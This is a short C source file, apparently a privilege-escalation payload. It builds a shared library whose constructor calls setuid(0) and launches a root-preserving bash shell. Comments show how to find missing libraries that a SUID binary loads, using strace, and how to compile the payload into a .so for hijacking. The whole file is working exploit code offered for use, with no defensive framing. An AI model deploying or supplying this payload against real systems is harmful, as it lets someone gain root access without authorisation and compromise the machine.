#include <stdio.h>
#include <stdlib.h>

/* strace <SUID> 2>&1 | grep -iE "open|access|no such file" */
/* Compile: gcc -shared -fPIC <LIBNAME> -o <LIBNAME>.so */

static void inject() __attribute__((constructor));

void inject() {
        setuid(0);
        system("/bin/bash -p");
}